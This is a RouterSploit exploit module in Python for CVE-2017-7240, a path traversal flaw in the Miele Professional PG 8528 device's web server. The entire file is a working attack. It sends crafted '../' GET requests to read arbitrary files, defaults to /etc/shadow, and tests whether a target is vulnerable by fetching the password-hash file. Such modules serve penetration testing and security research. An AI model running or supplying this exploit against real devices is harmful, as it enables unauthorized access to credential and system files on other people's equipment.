from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Miele Professional PG 8528 Path Traversal",
        "description": "Module exploits Miele Professional PG 8528 Path Traversal vulnerability which allows "
                       "to read any file on the system.",
        "authors": (
            "Jens Regel, Schneider & Wulf EDV-Beratung GmbH & Co. KG",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7240",
            "https://www.exploit-db.com/exploits/41718/",
        ),
        "devices": (
            "Miele Professional PG 8528 PST10",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    filename = OptString("/etc/shadow", "File to read from filesystem")

    def run(self):
        if self.check():
            path = "/../../../../../../../../../../../..{}".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path
            )

            if response is None:
                return

            if response.status_code == 200 and response.text:
                print_success("Success! File: %s" % self.filename)
                print_info(response.text)
            else:
                print_error("Exploit failed")
        else:
            print_error("Device seems to be not vulnerable")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/../../../../../../../../../../../../etc/shadow"
        )

        if response and utils.detect_file_content(response.text, "/etc/shadow"):
            return True  # target vulnerable

        return False  # target is not vulnerable
